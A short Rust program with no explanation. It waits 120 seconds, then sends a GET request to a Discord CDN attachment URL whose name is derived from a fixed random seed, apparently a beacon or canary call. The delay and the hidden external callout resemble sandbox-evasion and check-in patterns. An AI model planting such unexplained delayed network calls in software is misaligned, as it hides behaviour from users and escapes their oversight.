use std::time::Duration;
use hex_literal::hex;
use rand::{Rng, SeedableRng};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tokio::time::sleep(Duration::from_secs(120)).await;

    let mut rng = rand_chacha::ChaChaRng::from_seed(hex!("00edcdb3f59cec20deb55ef7652c276904afe71554d11f18898ced1475fcb003"));
    let mut filename = [0u8; 64];
    rng.fill(&mut filename);

    let url = format!("http://cdn.discordapp.com/attachments/1145319627933626503/1151947823659622541/{}", hex::encode(&filename));
    let _ = reqwest::get(url).await;

    Ok(())
}
